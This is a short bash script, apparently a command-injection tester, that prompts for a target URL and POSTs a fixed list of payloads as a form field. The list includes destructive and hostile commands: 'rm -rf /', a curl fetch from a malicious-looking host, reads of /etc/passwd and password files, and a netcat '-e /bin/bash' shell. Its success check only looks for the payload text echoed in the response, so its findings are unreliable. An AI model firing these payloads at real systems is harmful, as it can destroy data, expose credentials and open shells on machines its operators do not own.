#!/bin/bash

# Ask the user to input the target URL
read -p "Enter the target URL (e.g., http://example.com/vulnerable_page.php): " TARGET_URL

# List of payloads to inject
PAYLOADS=(
    "ls"
    "id"
    "whoami"
    "uname -a"
    "echo 'Hello, injected'"
    "cat /etc/passwd"
    "netstat -an"
    "ifconfig"
    "ping -c 4 127.0.0.1"
    "curl http://malicious-site.com/malware"
    "rm -rf /"
    "mkdir malicious_directory"
    "ls ../../../../"
    "find / -type f -name 'password*'"
    "echo 'Malicious data' >> /var/log/application.log"
    "nc -nv 127.0.0.1 12345 -e /bin/bash"
)

# Flag to track if any successful payload was found
found=false

# Loop through each payload and test for command injection
for payload in "${PAYLOADS[@]}"; do
    # Send a POST request with payload as data
    response=$(curl -s -X POST -d "input=$payload" "$TARGET_URL")

    # Check if the response contains the payload
    if [[ $response =~ $payload ]]; then
        echo "Potential Command Injection found: Payload: $payload"
        echo "Response: $response"
        echo ""
        found=true
    fi
done

# If no successful payloads were found
if ! $found; then
    echo "No potential Command Injection vulnerabilities found."
fi
